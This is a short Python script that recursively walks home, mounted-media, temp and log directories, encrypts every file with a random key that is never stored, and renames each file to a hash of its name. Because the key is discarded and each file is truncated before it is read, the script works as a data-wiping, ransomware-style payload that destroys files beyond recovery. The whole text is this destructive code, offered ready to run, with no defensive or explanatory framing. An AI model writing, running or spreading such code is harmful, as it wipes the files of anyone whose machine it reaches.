#!/usr/bin/env python

import os
import gc
from cryptography.fernet import Fernet # pip install cryptography
from hashlib import sha512
import sys


sys.setrecursionlimit(9999999)

dir_list = ['/home', '/run/media', '/mnt', '/tmp', '/var/log', 'var/cache', '/var/db']
dirs_exclude = ['node_modules', 'vendor', '.git']

print('!!')


def disguise(dirs):
    discovered_dirs = []

    for dir_path in dirs:
        for name in os.listdir(dir_path):
            path = '{}/{}'.format(dir_path, name)

            if os.path.isfile(path):
                print('Encrypting file "{}"'.format(path))

                try:
                    hash_content(path)
                    os.rename(path, '{}/{}'.format(dir_path, sha512(name.encode('utf8')).hexdigest()))
                except:
                    pass

                continue
            elif os.path.isdir(path) and name not in dirs_exclude:
                discovered_dirs.append(path)

    if len(discovered_dirs):
        return disguise(discovered_dirs)

    return None


def hash_content(file_path):
    fernet = Fernet(Fernet.generate_key())

    with open(file_path, 'rb') as buffer:
        with open(file_path, 'wb') as file:
            file.write(fernet.encrypt(buffer.read()))
            file.close()

        buffer.close()


if __name__ == '__main__':
    disguise(dir_list)
    gc.collect()
    print('Done!')
